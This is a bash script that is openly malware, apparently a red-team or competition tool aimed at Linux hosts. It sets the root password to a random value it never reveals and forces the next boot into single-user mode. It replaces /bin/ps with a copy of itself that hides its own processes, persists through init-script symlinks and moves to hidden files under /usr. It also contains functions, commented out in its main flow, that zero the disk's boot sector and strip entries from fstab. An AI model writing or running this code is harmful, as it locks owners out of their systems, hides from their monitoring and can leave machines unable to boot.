#!/bin/bash

function change_root_passwd {
    # Change Root Password
    new_passwd=`cat /dev/urandom | tr -cd 'a-f0-9' | head -c 12`
    echo "Changing root password to $new_passwd..."
    yes $new_passwd | passwd
} &> /dev/null

function wipe_bootloader {
    # Wipe boot loader
    echo "Wiping bootloader..."
    dd if=/dev/zero of=/dev/sda bs=446 count=1
} &> /dev/null

function clear_fstab {
    # Erase important lines from fstab
    echo "Erasing lines from fstab..."
    sed -i '/lv_root/d' /etc/fstab
    sed -i '/boot/d' /etc/fstab
} &> /dev/null

function persist_in_ls {
    # Replace ls with self
    mysum=`md5sum $0 | cut -d' ' -f1`
    lssum=`md5sum /bin/ls | cut -d' ' -f1`

    if [ "$mysum" != "$lssum" ]; then
        mv /bin/ls /bin/.ls
        cp $0 /bin/ls
        chmod ugo+rx /bin/ls
        #touch -d "1 year ago" /bin/ls this is too hard
    fi 
} &>/dev/null

function persist_in_ps {
    # Replace ls with self
    mysum=`md5sum $0 | cut -d' ' -f1`
    pssum=`md5sum /bin/ps | cut -d' ' -f1`

    if [ "$mysum" != "$pssum" ]; then
        mv /bin/ps /bin/.ps
        cp $0 /bin/ps
        chmod ugo+rx /bin/ps
    fi 
} &>/dev/null

function attach_to_initscript {
    # add self to a random init script
    sig='### END INIT INFO'
    random_script=`grep -l "$sig" /etc/rc3.d/S* | sort -R | head -n 1`
    echo "Attaching $1 to $random_script..."
    sed -i "s|$sig|&\n$1|" $random_script
} &>/dev/null

function persist_in_initscript {
    echo "$1 &>/dev/null" > /etc/init.d/eDuZ1nah

    if [ ! -f /etc/rc3.d/S01eDuZ1nah ]; then
        ln -s /etc/init.d/eDuZ1nah /etc/rc3.d/S01eDuZ1nah
    fi
    
    if [ ! -f /etc/rc5.d/S01eDuZ1nah ]; then
        ln -s /etc/init.d/eDuZ1nah /etc/rc5.d/S01eDuZ1nah
    fi
} &>/dev/null

function send_to_singleuser {
    sed -i 's/:3:/:1:/' /etc/inittab
} &>/dev/null

function relocate {
    # Relocate and re-execute.. arg $1.. 1 means move 0 means stay
    new_filename=`cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32`
    random_folder=`find /usr -maxdepth 1 -mount -type d | sort -R | head -n 1`
    new_script=$random_folder'/.'$new_filename'.sh'
    echo "Relocating to $new_script..."
    if [ $1 -eq 1 ]; then
        mv $0 $new_script
    else
        cp $0 $new_script
    fi
    #touch -d "1 year ago" $new_script
    #attach_to_initscript $new_script
    persist_in_initscript $new_script
    $new_script &
} &>/dev/null

if [ "$0" == "/bin/ps" ]; then
    if [ `/bin/.ps aux | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        relocate 0
    fi
    # Gotta give um something, we'll run ls in the background as a hint
    number=$RANDOM
    let "number %= 15"
    psoutput=$(/bin/.ps "$@")
    psoutput=$(echo "$psoutput" | sed '/\(\.ps\|\..*\)/d' | sed '1~4 s/^/\t/')
    echo "$psoutput"

    if [ $number -eq 1 ]; then
        echo "PERMISSION DENIED....and...."
        echo "YOU DIDN'T SAY THE MAGIC WORD!"
        echo "YOU DIDN'T SAY THE MAGIC WORD!"
        echo "YOU DIDN'T SAY THE MAGIC WORD!"
        echo "YOU DIDN'T SAY THE MAGIC WORD!"
        echo "YOU DIDN'T SAY THE MAGIC WORD!"
    fi
    exit 0

fi

sleep 5
change_root_passwd
#wipe_bootloader 
#clear_fstab
persist_in_ps
send_to_singleuser
relocate 1

